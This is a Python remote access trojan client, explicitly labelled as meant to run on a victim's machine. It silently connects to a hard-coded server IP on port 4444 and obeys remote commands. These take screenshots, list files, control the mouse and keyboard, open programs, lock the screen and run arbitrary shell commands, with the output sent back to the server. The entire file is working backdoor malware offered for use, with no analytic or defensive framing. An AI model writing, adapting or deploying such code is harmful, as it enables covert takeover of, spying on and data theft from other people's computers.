# client.py
# **This script is meant to be run on the victim's machine**

import socket
import os
import platform
import pyautogui
import subprocess
import ctypes

# Function to gather basic system information
def get_info():
    return f"OS: {platform.system()} {platform.release()}\nCurrent Directory: {os.getcwd()}"

# Function to take a screenshot and save it locally
def take_screenshot():
    try:
        screenshot = pyautogui.screenshot()
        screenshot.save("screenshot.png")
        return "Screenshot saved as 'screenshot.png'"
    except Exception as e:
        return f"Screenshot failed: {e}"

# Function to list files in a specified directory
def list_files(path):
    try:
        return "\n".join(os.listdir(path))
    except Exception as e:
        return f"Failed to list directory: {e}"

# Function to move the mouse cursor to a specific (x, y) position
def move_mouse(x, y):
    try:
        pyautogui.moveTo(int(x), int(y))
        return f"Mouse moved to ({x}, {y})"
    except Exception as e:
        return f"Mouse move error: {e}"

# Function to type text on the screen
def type_text(text):
    try:
        pyautogui.write(text)
        return f"Typed: {text}"
    except Exception as e:
        return f"Typing error: {e}"

# Function to open a program using its name or path
def open_program(program):
    try:
        subprocess.Popen(program)
        return f"Opened: {program}"
    except Exception as e:
        return f"Program open error: {e}"

# Function to lock the screen (Windows only)
def lock_screen():
    try:
        ctypes.windll.user32.LockWorkStation()
        return "Screen locked."
    except Exception as e:
        return f"Lock failed: {e}"

# Function to run a shell command and return the output
def run_command(cmd):
    try:
        result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, text=True)
        return result.strip()
    except subprocess.CalledProcessError as e:
        return f"Command failed:\n{e.output}"

# Command handler: maps received strings to appropriate function calls
def handle_command(command):
    if command == "info":
        return get_info()
    elif command == "screenshot":
        return take_screenshot()
    elif command.startswith("list "):
        _, path = command.split(" ", 1)
        return list_files(path)
    elif command.startswith("move_mouse "):
        _, x, y = command.split()
        return move_mouse(x, y)
    elif command.startswith("type "):
        _, text = command.split(" ", 1)
        return type_text(text)
    elif command.startswith("open "):
        _, program = command.split(" ", 1)
        return open_program(program)
    elif command == "lock":
        return lock_screen()
    elif command.startswith("cmd "):
        _, shell_cmd = command.split(" ", 1)
        return run_command(shell_cmd)
    elif command == "exit":
        return "exit"
    else:
        return "Unknown command"

# ==== Client Initialization ====
host = '10.42.185.22'  # Server IP address (change as needed)
port = 4444            # Server port

s = socket.socket()

# Attempt to connect silently
try:
    s.connect((host, port))
except:
    exit()  # If connection fails, silently exit

# Main loop to receive and handle commands
while True:
    try:
        command = s.recv(1024).decode()  # Receive command from server
        if not command:
            break
        response = handle_command(command)  # Handle command and get response
        if response == "exit":
            break
        s.send(response.encode())  # Send result back to server
    except:
        break

s.close()  # Close connection if any error or exit command
